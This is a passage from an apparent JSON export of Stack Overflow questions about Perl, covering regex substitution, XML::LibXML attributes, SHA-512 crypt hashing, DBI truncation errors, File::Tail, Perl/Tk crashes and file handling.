\"Europe\"</p>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":205,"score":5,"question_id":11970541,"title":"What is the difference between \"perl test.pl\" and \"./test.pl\"?","body":"<p>I have observed that there are two ways of executing a perl program:</p>\n\n<pre><code>perl test.pl\n</code></pre>\n\n<p>and</p>\n\n<pre><code>./test.pl\n</code></pre>\n\n<p>What is the exact difference between these two and which one is recommendable?</p>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12320024,"title":"Manipulating backreferences for substitution in perl","body":"<p>As a part of an attempt to replace scientific numbers with decimal numbers I want to save a backreference into a string variable, but it doesn't work.</p>\n\n<p>My input file is:</p>\n\n<pre><code>,8E-6,\n,-11.78E-16,\n,-17e+7,\n</code></pre>\n\n<p>I then run the following:</p>\n\n<pre><code>open FILE, \"+&lt;C:/Perl/input.txt\" or die $!;\nopen(OUTPUT, \"+&gt;C:/Perl/output.txt\") or die;\n\nwhile (my $lines = &lt;FILE&gt;){\n\n  $find = \"(?:,)(-?)(0|[1-9][0-9]*)(\\.)?([0-9]*)?([eE])([+\\-]?)([0-9]+)(?:,)\";\n  $noofzeroesbeforecomma = eval(\"$7-length($4)\");\n  $replace = '\"foo $noofzeroesbeforecomma bar\"';\n\n  $lines =~ s/$find/$replace/eeg;\n  print (OUTPUT $lines);\n}\n\nclose(FILE);\n</code></pre>\n\n<p>I get</p>\n\n<pre><code>foo  bar\nfoo  bar\nfoo  bar\n</code></pre>\n\n<p>where I would have expected</p>\n\n<pre><code>foo 6 bar\nfoo 14 bar\nfoo 7 bar\n</code></pre>\n\n<p><code>$noofzeroesbeforecomma</code> seems to be empty or non-existant. </p>\n\n<p>Even with the following adjustment I get an empty result</p>\n\n<pre><code>$noofzeroesbeforecomma = $2;\n</code></pre>\n\n<p>Only inserting <code>$2</code> directly in the replace string gives me something (which is then, unfortunately, not what I want).</p>\n\n<p>Can anyone help?</p>\n\n<p>I'm running Strawberry Perl (5.16.1.1-64bit) on a 64-bit Windows 7 machine, and quite inexperienced with Perl</p>\n"},{"tags":["perl","openoffice.org","odf","libreoffice"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":432,"score":5,"question_id":6400288,"title":"How to add a text caption to an image with OpenOffice::OODoc?","body":"<p>I have the following code that creates an odf-document with a heading and a picture:</p>\n\n<pre><code>#!/usr/bin/perl \n\nuse strict;\nuse warnings;\nuse OpenOffice::OODoc;\n\nmy $doc = odfDocument(\n    file   =&gt; 'test.odt',\n    create =&gt; 'text'\n);\n\nmy $head = $doc-&gt;appendHeading(\n    text  =&gt; \"This is a Test\",\n    style =&gt; 'Heading 1'\n);\n\nmy $style = $doc-&gt;createImageStyle(\"Photo\");\nmy $image = $doc-&gt;createImageElement(\n    'some picture',\n    style      =&gt; 'Photo',\n    attachment =&gt; $head,\n    size       =&gt; '4cm, 12cm',\n    link       =&gt; '/full/path/to/picture.png'\n);\n\n$doc-&gt;save();\n</code></pre>\n\n<p>How can I add a text caption to the picture? When I create a text caption in LibreOffice the  part of the 'content.xml' where a caption is created looks like this.</p>\n\n<pre><code>&lt;draw:frame draw:style-name=\"fr1\" draw:name=\"Frame1\" text:anchor-type=\"as-char\" svg:y=\"0cm\" svg:width=\"4.001cm\" draw:z-index=\"0\"&gt;\n  &lt;draw:text-box fo:min-height=\"12cm\"&gt;\n    &lt;text:p text:style-name=\"Caption\"&gt;\n      &lt;draw:frame draw:style-name=\"fr2\" draw:name=\"Eiffel Tower\" text:anchor-type=\"paragraph\" svg:x=\"0.004cm\" svg:y=\"0.002cm\" svg:width=\"4.001cm\" style:rel-width=\"100%\" svg:height=\"12cm\" style:rel-height=\"scale\" draw:z-index=\"1\"&gt;\n        &lt;draw:image xlink:href=\"full/path/to/picture.png\" xlink:type=\"simple\" xlink:show=\"embed\" xlink:actuate=\"onLoad\"/&gt;\n      &lt;/draw:frame&gt;\n      test caption\n    &lt;/text:p&gt;\n  &lt;/draw:text-box&gt;\n&lt;/draw:frame&gt; \n</code></pre>\n\n<p>I think it creates a frame and then puts the image and the caption text inside of it. I am lost at this point. I couldn't find something about adding elements to frames in the documentation either.</p>\n"},{"tags":["linux","perl","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12320543,"title":"perl library path","body":"<p>I need to retrieve the path where the perl libraries Statistics and Distributions are located. The path is necessary to run the script. I'm on a computer cluster. Can anyone help me?</p>\n\n<p>Thanks</p>\n"},{"tags":["xml","perl"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12320700,"title":"Parsing issue with xml: namespace attribute with Perl LibXML","body":"<p>I am trying to parse an XML file with the following contents:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;sentences&gt;\n&lt;lastmodified&gt;none&lt;/lastmodified&gt;\n&lt;sentencedefs xml:lang=\"common\"&gt;\n&lt;/sentencedefs&gt;\n&lt;sentencedefs xml:lang=\"en-US\"&gt;\n&lt;baselanguage xml:lang=\"en-US\"/&gt;\n&lt;/sentencedefs&gt;\n&lt;/sentences&gt;\n</code></pre>\n\n<p>The perl code which I use to parse this looks like this (actually this is a cut down version of the key portion of the code):</p>\n\n<pre><code>use 5.006_001;\nuse strict;\nuse warnings;\nuse English '-no_match_vars';\nuse XML::LibXML;\n\nmy $SENTENCEDEFS       = \"sentencedefs\";\nmy $LANG               = \"lang\";\n\nmy $lParser = XML::LibXML-&gt;new;\nmy $lSentencesDoc  = $lParser-&gt;parse_file(\"sentences.xml\");\nmy $lSentencesRoot = $lSentencesDoc-&gt;documentElement();\nmy @lSentenceDefs = $lSentencesRoot-&gt;getElementsByTagName($SENTENCEDEFS);\n\nforeach my $lDefs (@lSentenceDefs)\n{\n  my @lAttrs = $lDefs-&gt;attributes();\n  foreach my $lAttr (@lAttrs)\n  {\n    print(\"Attr: \" . $lAttr-&gt;toString(1) . \"\\n\");\n  }\n\n  my $lLang = $lDefs-&gt;getAttribute($LANG);\n  my $lFound = defined($lLang);\n  print(\"Found $LANG? $lFound \\n\");\n}\n</code></pre>\n\n<p>I have previously been using LibXML V1.58. I am now testing against LibXML V1.70 and have found that the output is different:</p>\n\n<p>V1.58:</p>\n\n<pre><code>Attr:  xml:lang=\"common\"\nFound lang? 1\nAttr:  xml:lang=\"en-US\"\nFound lang? 1\n</code></pre>\n\n<p>V1.70:</p>\n\n<pre><code>Attr:  xml:lang=\"common\"\nFound lang?\nAttr:  xml:lang=\"en-US\"\nFound lang?\n</code></pre>\n\n<p>V1.70 only finds the attribute if I use $LANG=\"xml:lang\".</p>\n\n<p>Can anyone explain why LibXML V1.70 is handling my XML differently? Is there a change I can make to my code to make it behave the same when running with both V1.58 and V1.70? I can't change the XML document.</p>\n"},{"tags":["ruby","perl","guard"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":86,"score":2,"question_id":12320745,"title":"Is there a Perl alternative to the guard gem for ruby?","body":"<p>I've been amazed at the power of the <a href=\"https://github.com/guard/guard\" rel=\"nofollow\">guard</a> ruby gem and was hoping to find something similar to monitor my Perl project for changes and run similar unit tests and livereload out of the box like the ruby gem without having to resort to installing ruby?</p>\n\n<p>Any idea's/recommendations? </p>\n"},{"tags":["linux","perl","unix","operating-system"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12311825,"title":"Read multiple files in a directory and compare with another file","body":"<p>I have two files</p>\n\n<pre><code>File 1 in reading directory is of following format \n\nRead 1 A T\nRead 3 T C\nRead 5 G T\nRead 7 A G\nRead 10 A G\nRead 12 C G\n\nFile 2 in directory contains\n\n    Read 5 A G\n    Read 6 T C\n    Read 7 G A\n    Read 8 G A\n    Read 20 A T\n</code></pre>\n\n<p>File2 contains</p>\n\n<pre><code>1\n2\n3\n4\n5\n6\n7\n</code></pre>\n\n<p>I need to read file 2 first for positons and print out the corresponding value from opened file in directory in horizontal manner. If no match for that postion, it is printed as \"-\". The output for above should be </p>\n\n<pre><code>     1 2 3 4 5 6 7\nRead T - C - T - G\nRead - - - - G C A\n</code></pre>\n\n<p>I need to do that for all the files and print in above format in another row. so output will be only one file with number of rows equals no of files. Can i do this in perl easily?</p>\n"},{"tags":["perl","cryptography","passwords","salt","password-encryption"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":225,"score":6,"question_id":11017330,"title":"Creating glibc 2.7 style Sha-512 crypt hashes in Perl","body":"<p>So, I have a website that reads/verifies (and writes) password hashes from the database, and I have something that makes SHA-512 style password hashes for that, ones that look like:</p>\n\n<pre><code>$6$GloHensinmyampOc$AxvlkxxXk36oDOyu8phBzbCfLn8hyWgoYNEuqNS.3dHf4JJrwlYCqha/g6pA7HJ1WwsADjWU4Qz8MfSWM2w6F.\n</code></pre>\n\n<p>The website is java based, so I wrote a SHA-512 hasher for it. Trouble is, there are a bunch of perl cron jobs that run that <strong>also</strong> need to verify password hashes occasionally to the database, and since those run on a Solaris box, it's crypt doesn't support the $6$ format.</p>\n\n<p>So, when I do:</p>\n\n<pre><code>printf(\"crypt =&gt; '%s'\\n\",crypt(\"Hello\",'$1$CygnieHyitJoconf$'));\n</code></pre>\n\n<p>I get back sensibly:</p>\n\n<pre><code>crypt =&gt; '$1$CygnieHy$n9MlDleP0qmGCfpbnVYy11'\n</code></pre>\n\n<p>Whereas, if I do</p>\n\n<pre><code>printf(\"crypt =&gt; '%s'\\n\",crypt(\"Hello\",'$6$CygnieHyitJoconf$'));\n</code></pre>\n\n<p>I get an unhelpful</p>\n\n<pre><code>crypt =&gt; ''\n</code></pre>\n\n<p>Is there a way to get the SHA-512 password hashes in Perl on a box that isn't using glibc? (That's what I get told when I do a search mostly (\"use crypt\").</p>\n\n<p>I'd really rather not re-implement SHA-512 password hashes in perl.</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl","script","parameters","run","do"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12297890,"title":"How to run a perl script from another passing parameters?","body":"<p><strong>How to run a perl script from another passing parameters?</strong>  </p>\n\n<p>I'm trying to use a solution found in a internet post that i can't find anymore.<br>\nIt was something like:  </p>\n\n<pre><code>do 'script.cgi param1 param2';\n</code></pre>\n\n<p>And in the other script I'm using simply the shift to get those parameters:</p>\n\n<pre><code>#Parameters\nmy $param1= shift;\nmy $param2= shift;\n</code></pre>\n\n<p>I saw people using system with args, but is it better for real?<br>\nIf not, how can I fix the solution with 'do EXPR'?<br>\nThanks in advance.</p>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":123,"score":3,"question_id":12297361,"title":"How to compress 4 consecutive blank lines into one single line in Perl","body":"<p>I'm writing a Perl script to read a log so that to re-write the file into a new log by removing empty lines in case of seeing any consecutive blank lines of 4 or more.  In other words, I'll have to compress any 4 consecutive blank lines (or more lines) into one single line; but any case of 1, 2 or 3 lines in the file will have to remain the format.  I have tried to get the solution online but the only I can find is </p>\n\n<pre><code>perl -00 -pe ''\n</code></pre>\n\n<p>or</p>\n\n<pre><code>perl -00pe0  \n</code></pre>\n\n<p>Also, I see the example in vim like this to delete blocks of 4 empty lines <code>:%s/^\\n\\{4}//</code> which match what I'm looking for but it was in vim not Perl.  Can anyone help in this?  Thanks.</p>\n"},{"tags":["perl","syntax","operators","brackets","curly-brackets"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":113,"score":6,"question_id":12318937,"title":"Perl syntax with consecutive operators and brakcets","body":"<p>I'm just trying to learn a bit of Perl and have come across this:</p>\n\n<pre><code>foreach $element (@{$records})\n{\n    do something;\n}\n</code></pre>\n\n<p>To my newbie eyes, this reads: \n    \"for each element in an array named @{$records}, do something\" \nbut, since that seems an unlikely name for an array (with \"<code>@{$</code>\" altogether), I imagine it isn't that simple? </p>\n\n<p>I've also come across \"<code>%$</code>\" used together.\nI know <code>%</code> signifies a hash and <code>$</code> signifies a scalar but don't know what they mean together.</p>\n\n<p>Can anyone shed any light on these?</p>\n"},{"tags":["perl","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12318878,"title":"perl File::Tail delay","body":"<p>I'm using the perl File::Tail library to tail the output of a file and parse it's output.</p>\n\n<p>Everything's working fine except there seems to be about a 10 second delay after I start the script before it starts outputting.  After the first read, it works fine and all output is instantaneous.  All of the writes during the delay seem to be outputted once it starts working, so I'm not losing any data.  I don't think it has nothing to do with the file I'm reading because running a regular \"tail -f\" works instantly.</p>\n\n<p>Heres the entire script:</p>\n\n<pre><code>#!/bin/perl\nuse File::Tail;\n\n$file=File::Tail-&gt;new(\"file.txt\");\n\nwhile (defined($line=$file-&gt;read)) {\n    print \"$line\\n\";\n}\n</code></pre>\n\n<p>I copied this from an example somewhere online.  I'm not very familiar with perl or File::Tail I'm hoping I'm doing something wrong.  Any help would be appreciated.</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12318523,"title":"Regex match space in perl","body":"<p>I am trying to match </p>\n\n<p><code>Begin_Page {Some Number}</code> </p>\n\n<p>while trying to avoid </p>\n\n<p><code>Begin_Page_{Some Number}</code></p>\n\n<p>I tried </p>\n\n<p><code>$line =~ m/^Begin_Page\\s/</code></p>\n\n<p>but I noticed it sometimes does not match anything file while surely had <code>Begin_Page 8703</code></p>\n"},{"tags":["perl","module","autoload"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12317939,"title":"perl automatic module loading like in php","body":"<p>I am creating a bigger application in Perl, and I am wondering whether something like class autoloading similar to phpâs can be done in Perl?</p>\n\n<p>I checked catching exceptions and $<code>SIG{__DIE__}</code> redefining etc., but this doesn't seem to be solution because it will be stopped on first âcannot find method new via packageâ, and then to load every module I should again call the whole program.</p>\n\n<p>One solution could be to maybe scan all files in my lib and give it to <code>@INC</code> at runtime, but I donât know whether this is good solution â probably not.</p>\n\n<p>Do anybody have a suggestion?</p>\n"},{"tags":["python","regex","perl","script","pattern-matching"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":224,"score":3,"question_id":4605289,"title":"Listing all patterns that a regex matches","body":"<p>I am looking for a way to list all possible patterns from a finite regex (with no duplicates). Is there any source available?</p>\n"},{"tags":["regex","arrays","perl","split","pattern-matching"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":308,"score":1,"question_id":5183896,"title":"Stopword removal and save the new file","body":"<p>I have text files which I need to remove stop words from them.  I have the stop words stored in a text file.  I load the \"stop-word\" text file into my Perl script and store the stop words in an array called \"stops\".</p>\n\n<p>Currently I am loading a different set of text files and I am storing them in a separate array then doing a pattern match to see if any of the words are indeed stop words.\nI can print the stop words and know which ones are occurring in the files but how do I remove them from the text file and store a new text file so it has no stop words?</p>\n\n<p>i.e Stopwords:\nthe\na\nto\nof\nand\ninto</p>\n\n<p>Text File:\n\"The girl was driving and crashed into a man\"</p>\n\n<p>Resulting file:\ngirl was driving crashed man</p>\n\n<p>I load the file in:</p>\n\n<pre><code>$dirtoget = \"/Users/j/temp/\";\nopendir( IMD, $dirtoget ) || die(\"Cannot open directory\");`\n@thefiles = readdir(IMD);`\n\nforeach $f (@thefiles) {\nif ( $f =~ m/\\.txt$/ ) {\n\n    open( FILE, \"/Users/j/temp/$f\" ) or die \"Cannot open FILE\";\n\n    while (&lt;FILE&gt;) {\n        @file = &lt;FILE&gt;;\n</code></pre>\n\n<p>Here is the pattern matching loop:</p>\n\n<pre><code>  foreach $word(split) {\n                foreach $x (@stop) {\n                   if  ($x =~ m/\\b\\Q$word\\E\\b/) {\n                 $word='';\n                        print $word,\"\\n\";\n</code></pre>\n\n<p>Setting <code>$word</code> to be null.</p>\n\n<p>Or I could do:</p>\n\n<pre><code>    $word = '' if exists $stops{$word};\n</code></pre>\n\n<p>I'm just not sure how I set output file to no longer contain the matching words.\nIs it stupid to store the words which don't match in an array and output them to a file?  </p>\n"},{"tags":["html","regex","perl","pattern-matching"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":344,"score":2,"question_id":5650376,"title":"Perl Regex Pattern Matching","body":"<p>I want to use regex from a source file named <code>source.html</code> or <code>source.txt</code>:</p>\n\n<pre><code>&lt;OPTION value=5&gt;&amp;nbsp;&amp;nbsp;5 - Course Alpha (3)&lt;/OPTION&gt; &lt;OPTION value=6&gt;&amp;nbsp;&amp;nbsp;6 - Course Beta (3)&lt;/OPTION&gt;\n</code></pre>\n\n<p>to get:</p>\n\n<pre><code>5 - Course Alpha (3)\n6 - Course Beta (3)\n</code></pre>\n\n<p>I mean I have to find a pattern:</p>\n\n<pre><code>&lt;OPTION v\n</code></pre>\n\n<p>and </p>\n\n<pre><code> finding first number after it \n</code></pre>\n\n<p>so getting everything till I see:</p>\n\n<pre><code>&lt;/OPTION&gt;\n</code></pre>\n\n<p>How can I implement it with Perl using Regex?</p>\n\n<p><strong>PS:</strong> It should read the content from a file and write output to a file.</p>\n"},{"tags":["perl","selenium","automation","selenium-rc"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":12296948,"title":"How to generate report for perl automation?","body":"<p>I have doubts while working with <code>selenium RC</code> and <code>PERL</code>.  </p>\n\n<ol>\n<li>I recorded some test using selenium IDE .</li>\n<li>Exported the test with option <code>PERL</code>. </li>\n<li>Installed <code>PERL</code>.</li>\n<li>I downloaded and set up Selenium RC in my machine. </li>\n<li>I started selenium server from command prompt (<code>-jar selenium-server.jar</code>). </li>\n<li>Now able to run the PERL scripts.</li>\n</ol>\n\n<p>There is no test result/report generated after test run. \nCould anyone let me know how we can generate test result when we work with Selenium RC using perl script ? </p>\n\n<p>My code looks like below :</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Time::HiRes qw(sleep);\nuse Test::WWW::Selenium;\nuse Test::More \"no_plan\";\nuse Test::Exception;\n\ncode follows here\n</code></pre>\n\n<p>I'm using only these packages from ppm.</p>\n"},{"tags":["perl","delete","key-value","hashes"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":62,"score":2,"question_id":12314403,"title":"Search through hash, if value is zero delete it in Perl","body":"<p>Hi I have some code as follows. I am trying to search through the hash and if I come across a value that is zero, I want to delete the whole key/value element.</p>\n\n<pre><code>my %hashy = (\n    a =&gt; my $a,\n    b =&gt; my $b,\n    c =&gt; my $c,\n    d =&gt; my $d,\n    e =&gt; my $e\n);\n\n$hashy{'a'} = 0;\n$hashy{'b'} = 1;\n$hashy{'c'} = 0;\n$hashy{'d'} = 2;\n$hashy{'e'} = 1;\nmy @keys = keys %hashy;\nmy @values = values %hashy;\nmy $ind = 0;\nforeach my $v (@values) {\n   delete $hashy{$keys[$ind]} if ($v == 0);\n}\n</code></pre>\n\n<p>So the expected output of printing <code>%hashy</code> would be: <code>b1d2e1</code> (ignoring order of elements)</p>\n\n<p>At the moment I get: <code>c0a0b1d2</code> which isn't even close... any help would be appreciated :)</p>\n"},{"tags":["perl","perl-data-structures","perl-hash"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":89,"score":1,"question_id":12316418,"title":"Accessing elements in hash of hash of arrays in perl","body":"<pre><code>my %PlannedPerWeek = (\n                    September =&gt; {\n                            Week1 =&gt; [80, 23, 199, 45, 19, 36],\n                            Week2 =&gt; [78, 21, 195, 43, 18, 36],\n                            Week3 =&gt; [76, 19, 191, 41, 17, 36],\n                            Week4 =&gt; [74, 17, 187, 39, 16, 36],\n                    }\n    );\n</code></pre>\n\n<p>I have the above hash of hash of arrays in a perl prog.\nHow do I access element say '199' from the above data structure.</p>\n"},{"tags":["perl","dbi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":12315397,"title":"Database fetchrow_array failed long truncated DBI attribute","body":"<p>i am pulling urls from my database with a perl script where i employ <strong>fetchrow_array</strong> to pull URL from the database which worked fine until i encountered a very long URL <code>georgelog24.blog.iskreni.net/?bid=6744d9dcf85991ed2e4b8a258153a1ab&amp;lid=ff9963b9a798ea335b75b5f7c0c295d1</code><br>\nthen it started to give me this error.</p>\n\n<pre><code>DBD::ODBC::st fetchrow_array failed: st_fetch/SQLFetch (long truncated DBI attribute LongTruncOk not set and/or LongReadLen too small) (SQL-HY000) [state was HY000 now 01004]\n[Microsoft][ODBC SQL Server Driver]String data, right truncation (SQL-01004) at C:\\test\\multihashtest2.pl line 44.\n</code></pre>\n\n<p>I believe this is on the database side as the code i have been using to pull URL has worked before. The database that i am using is <em>MSSQL server 2005.</em> </p>\n\n<p>the URL column in the database uses <strong>text</strong> type currently, but i have tried changing it to <strong>varchar(max)</strong> and <strong>nvarchar(max)</strong> but the error still stands.</p>\n\n<p>After a bit of trial and error i found that the maximum length of the url then i could query successfully with fetchrow_array was 81 characters. And since URLs can span ridiculous lengths sometimes, i cannot put a restriction on URL length. </p>\n\n<p>Can anybody help me understand and suggest a fix for this? </p>\n\n<p>FYI: line 44 is the first line in my code below</p>\n\n<pre><code>while (($myid,$url) = $statement_handle-&gt;fetchrow_array()) { # executes as many threads as there are jobs to do \n    my $thread = threads-&gt;create(\\&amp;webcrawl); #initiate thread\n    my $tid = $thread-&gt;tid;\n    print \"  - Thread $tid started\\n\";   #obtain thread no. and print\n    push (@Threads, $thread);   #push thread into array for \"housekeeping\" later on\n}\n</code></pre>\n"},{"tags":["perl","selenium","webdriver","jmeter","performance-testing"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":12293932,"title":"Use perl Selenium test scripts for performance testing in jmeter","body":"<p>I have selenium web driver test scripts written in perl. Now i want to use them for performance testing with jmeter.<br></p>\n\n<p>Can any one help me how can i use it for performance testing?</p>\n\n<p>I tried few solutions like <a href=\"http://stackoverflow.com/questions/7817498/running-selenium-scripts-from-jmeter/7823777#7823777\">this</a> but no use because my tests are in perl.</p>\n"},{"tags":["perl","csv","perl-module"],"answer_count":5,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":12312673,"title":"How to Perl script to move files with specific extension from one folder to another and rename the moved files","body":"<p>I have 2 folders DIR1 DIR2 ,i need to move only files with extension \".csv\" only from dir1 to dir2</p>\n\n<p>and rename these file copied files with the timestamp in dir2</p>\n\n<pre><code>$dirname = \"\\\\dir1\\\\\"\n$dirname2= \"\\\\dir2\\\\\";\n$filterstring=\".csv\";\nopendir ( DIR, $dirname ) || die \"Error in opening dir $dirname\\n\";\nforeach my $filename (readdir(DIR))\n{\n      if ($filename =~ m/$filterstring/) {                          \n$cfile=$dirname.$filename;\nprint \"\\n moving $cfile from $dirname  to $dirname2 \\n\";\nmove($cfile,$dirname2);                             \n           }}\nclosedir(DIR);\n</code></pre>\n\n<p>This above code i dveloped moves files with extension \".csv \" and also files with filename \"abc_csv_uv.txt\"\nhow do i rectify this problem and then rename the moved files...please advise..need help</p>\n"},{"tags":["perl","tk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12312884,"title":"Can a bug in a perl program using Perl/TK cause memory corruption","body":"<p>I have the unfortunate task of maintaining an orphaned Perl program that uses Perl/TK to create a GUI and crashes in some situations with errors like </p>\n\n<pre><code>*** glibc detected *** /usr/bin/perl: corrupted double-linked list: 0x0000000003daf500 ***\n</code></pre>\n\n<p>Is it bassically possible for a Perl program to contain a bug that causes such behaviour or can I safely assume that a bug in the Perl interpreter and/or Perl/Tk is responsible and waiting for a new version of those tools might be the best approach to get rid of this problem?</p>\n\n<p>EDIT: To make my question more clear: would a bug like attempting to destroy a widget twice or calling a method on an already destroyed widget result in a clean error message or could if cause the problems I'm experiencing?</p>\n\n<p>EDIT2: The Perl version is  <code>5.10.0/x86_64-linux-thread-multi</code></p>\n\n<p>And it uses this modules:</p>\n\n<pre><code>use Tie::Watch;\nuse Tk;\nuse Tk::Balloon;\nuse Tk::Compound;\nuse Tk::DialogBox;\nuse Tk::LabFrame;\nuse Tk::NoteBook;\nuse Tk::Pane;\nuse Tk::ROText;\nuse DBI;\nuse Data::Dumper;\nuse XML::Simple::DTDReader;\n</code></pre>\n"},{"tags":["visual-studio-2010","perl","chromium"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":76,"score":2,"question_id":12294003,"title":"How do I check or modify the @INC in Visual Studio?","body":"<p>I was trying to build Chromium on Windows and met following error:</p>\n\n<pre><code>1&gt;------ Build started: Project: webcore_bindings_sources, Configuration: Debug Win32 ------\n1&gt;Build started 9/6/2012 11:31:11 AM.\n1&gt;InitializeBuildStatus:\n1&gt;  Touching \"..\\..\\..\\..\\..\\build\\Debug\\obj\\webcore_bindings_sources\\webcore_bindings_sources.unsuccessfulbuild\".\n1&gt;CustomBuild:\n1&gt;  ExceptionCodeDescription\n1&gt;  Can't locate strict.pm in @INC (@INC contains: C:\\chromium\\src\\third_party\\WebKit\\Source\\WebCore\\bindings\\scripts /usr/lib/perl5/5.10/i686-cygwin /usr/lib/perl5/5.10 /usr/lib/perl5/site_perl/5.10/i686-cygwin /usr/lib/perl5/site_perl/5.10 /usr/lib/perl5/vendor_perl/5.10/i686-cygwin /usr/lib/perl5/vendor_perl/5.10 /usr/lib/perl5/vendor_perl/5.10 /usr/lib/perl5/site_perl/5.8 /usr/lib/perl5/vendor_perl/5.8 .) at C:\\chromium\\src\\third_party\\WebKit\\Source\\WebCore\\dom\\make_dom_exceptions.pl line 33.\n1&gt;  BEGIN failed--compilation aborted at C:\\chromium\\src\\third_party\\WebKit\\Source\\WebCore\\dom\\make_dom_exceptions.pl line 33.\n</code></pre>\n\n<p>It looks like my Perl path is not in the Visual Studio, so I'd like to add the path into this <code>@INC</code>, but not sure where to add it.</p>\n"},{"tags":["perl","cgi"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":50,"score":0,"question_id":12310375,"title":"DynaLoader version error occurred","body":"<p>I'm searching for <strong>Dynaloader.pm file(Version 1.0.5)</strong>.\nBecause, DynaLoader version error occurred.</p>\n\n<p>LOG:</p>\n\n<pre><code>DynaLoader object version 1.05 does not match $DynaLoader::VERSION 1.10 at lib/DynaLoader.pm line 91.\n</code></pre>\n\n<p>As a simple solution, I think to change DynaLoader file from version 1.0.10 to 1.0.5.</p>\n\n<p>So I have three questions:</p>\n\n<p>1: Is the redistribution file? Where?<br />\n2: If version is 1.0.5, can I use <code>Time::Piece()</code> library?<br />\n3: Does anyone know another simple solution?(Not server compile, because server is not in my possession).</p>\n"},{"tags":["perl","perl-data-structures"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12293575,"title":"Need help on Perl Win32::Guitest","body":"<p>How can I access(connect) a particular wireless network in the \"view available networks\" window by using <code>Win32::GuiTest</code> automation.</p>\n\n<p>This is the view available networks window:</p>\n\n<p><img src=\"http://i.stack.imgur.com/hQY5D.png\" alt=\"enter image description here\"></p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12312761,"title":"Perl : Regex (Matching repetition)","body":"<p>I have a quick question. What am I doing wrong in below code:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nmy $num = \"12345\";\nprint \"$num \\n\" if $num =~ m/\\d{1,3}/;\n</code></pre>\n\n<p>As my number is 5 digits long, I was hoping that the output should not print anything because if statement is looking for a number with at least 1 digit and maximum 3 digits. But my script pints the output as below:</p>\n\n<pre><code># perl num.pl \n12345 \n</code></pre>\n\n<p>Am I misunderstanding the above regex?</p>\n\n<p>Thanks.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>So ,Actually I am trying to match an IP address like string. e.g. i want to match <code>11.222.3.444</code> but it did not work with <code>m/\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}/</code> \nso i started working on a single string containing only the number and hence then posted this on the stack overflow.</p>\n\n<p>If i have to put ^ OR $ then how should i go about using them if I want to match IP address like string s mentioned above.</p>\n\n<p>Thanks for you time.</p>\n"},{"tags":["perl","csv","perl-module"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":112,"score":0,"question_id":12293972,"title":"How check whether csv file with header is empty or not in perl","body":"<p>I have a csv file <code>xyz.csv</code> with contents</p>\n\n<pre><code>name,age,place,phone\nxyz,12,ohio,7372829\nsed,23,hrh,9890908\n</code></pre>\n\n<p>I need to parse the csv file and check whether it is a empty file i.e. it doesn't have the values for the headers provided.</p>\n\n<p>a null file <code>xyz.csv</code> would contain just the headers (headers no may decrease or increase)  e.g. decreased:</p>\n\n<pre><code>name,age,place,phone\n</code></pre>\n\n<p>increased:</p>\n\n<pre><code>name,age,place,mob,phno,ht\n</code></pre>\n\n<p>how do i check for a null file in below code and print whether is is null or not?</p>\n\n<p>i have developed below script to parse the csv</p>\n\n<pre><code>open(my $data, '&lt;', $file_c) or die \"Could not open '$file_c' $!\\n\";\n\nwhile (my $line = &lt;$data&gt;) \n{\n    next if ($. == 1);\n    chomp $line; \n    my @fields = split \",\" , $line; \n\n    print\"$fields[0] fields[1]\";\n 